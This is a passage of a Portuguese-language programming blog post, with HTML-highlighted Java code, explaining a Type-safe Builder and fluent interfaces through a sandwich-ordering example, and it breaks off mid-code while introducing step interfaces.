        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;umLanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;LancheBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheTerceiroPassoBuilder&lt;/span&gt; &lt;span class="nf"&gt;grande&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheTerceiroPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="nc"&gt;Tamanho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;GRANDE&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheTerceiroPassoBuilder&lt;/span&gt; &lt;span class="nf"&gt;normal&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheTerceiroPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="nc"&gt;Tamanho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;NORMAL&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LancheTerceiroPassoBuilder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;LancheTerceiroPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                          &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                          &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LancheQuartoPassoBuilder&lt;/span&gt; &lt;span class="nf"&gt;comQueijo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheQuartoPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LancheQuartoPassoBuilder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;LancheQuartoPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                        &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                        &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LanchePassoFinalBuilder&lt;/span&gt; &lt;span class="nf"&gt;comVegetais&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;of&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LanchePassoFinalBuilder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;LanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                       &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                       &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                       &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LanchePassoFinalBuilder&lt;/span&gt; &lt;span class="nf"&gt;comMolho&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="nf"&gt;build&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Dessa forma, não conseguimos pular nenhuma etapa obrigatória. Temos que seguir certinho as etapas para construção. E o melhor de tudo: quem for utilizar o Builder, não precisa conhecer a regra de negocio da lanchonete previamente. O código esta sucinto e claro o suficiente para que funcione como sua própria documentação.&lt;/p&gt;

&lt;p&gt;Lembre-se: escrevemos códigos para que outras pessoas entendam.&lt;/p&gt;

&lt;p&gt;O resultado da criação de um lanche com o Type-safe Builder ficou assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="nc"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;umLanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;CHURRASCO&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="no"&gt;TRES_QUEIJOS&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;grande&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comQueijo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;PRATO&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comVegetais&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;CEBOLA&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="no"&gt;TOMATE&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ALFACE&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;comMolho&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="no"&gt;CHIPOTLE&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
                &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;build&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Os Type-safe Builders lidam muito bem com parâmetros opcionais. Basta trazê-los para perto da classe que permite a criação final do objeto.&lt;/p&gt;

&lt;p&gt;Em Java, temos uma biblioteca chamada &lt;a href="https://github.com/skinny85/jilt"&gt;jilt&lt;/a&gt;, que pode nos auxiliar na criação de Type-safe Builders. Linguagens como o Kotlin também &lt;a href="https://kotlinlang.org/docs/type-safe-builders.html"&gt;ajudam na criação&lt;/a&gt; desse tipo de Builder.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#sobremesa-removendo-indire%C3%A7%C3%B5es-e-finalizando-com-classeou-interfaces"&gt;
  &lt;/a&gt;
  Sobremesa: removendo indireções e finalizando com classe(&lt;em&gt;ou interfaces?&lt;/em&gt;)
&lt;/h2&gt;

&lt;p&gt;Podemos dizer que criamos uma &lt;a href="https://martinfowler.com/bliki/FluentInterface.html"&gt;interface fluente&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Fizemos o nosso design de código de uma forma que ao ler nós conseguimos entendê-lo como uma simples e bela frase de uma música.&lt;/p&gt;

&lt;p&gt;Porém, vou te mostrar que ainda temos algumas indireções que podem gerar conflitos:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kx3JnbIc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gaiyzdwzy122l0mvnmv3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kx3JnbIc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gaiyzdwzy122l0mvnmv3.png" alt="Digitando . e aparecendo varias opções"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Viu só? Quando digitamos um ponto e nossa &lt;em&gt;IDE&lt;/em&gt; nos auxilia em qual método chamar, aparecem os passos internos.&lt;/p&gt;

&lt;p&gt;Isso acontece porque definimos nossas classes internas de Lanche (os Builders dos passos) como pacote-privado (&lt;em&gt;package-private&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;Como será que podemos fazer para restringir ainda mais o acesso dessas classes internas?&lt;/p&gt;

&lt;p&gt;Não podemos apenas definir como privado (&lt;em&gt;private&lt;/em&gt;), pois assim seriam inacessíveis fora da classe &lt;code&gt;Lanche&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Em Java, nós temos as interfaces. Assim como as classes (não internas), podem ser apenas pacote-privado ou públicas.&lt;/p&gt;

&lt;p&gt;Com as interfaces, conseguimos garantir uma API, um contrato que é assinado independente de quem a implemente.&lt;/p&gt;

&lt;p&gt;As interfaces de definição dos passos do nosso Type-safe Builder ficariam assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;interface&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;interface&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="nc"&gt;LancheTerceiroPasso&lt;/span&gt; &lt;span class="nf"&gt;grande&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
        &lt;span class="nc"&gt;LancheTerceiroPasso&lt;/span&gt; &lt;span class="nf"&gt;normal&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;interface&lt;/span&gt; &lt;span class="nc"&gt;LancheTerceiroPasso&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="nc"&gt;LancheQuartoPasso&lt;/span&gt; &lt;span class="nf"&gt;comQueijo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;interface&lt;/span&gt; &lt;span class="nc"&gt;LancheQuartoPasso&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="nc"&gt;LanchePassoFinal&lt;/span&gt; &lt;span class="nf"&gt;comVegetais&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;interface&lt;/span&gt; &lt;span class="nc"&gt;LanchePassoFinal&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
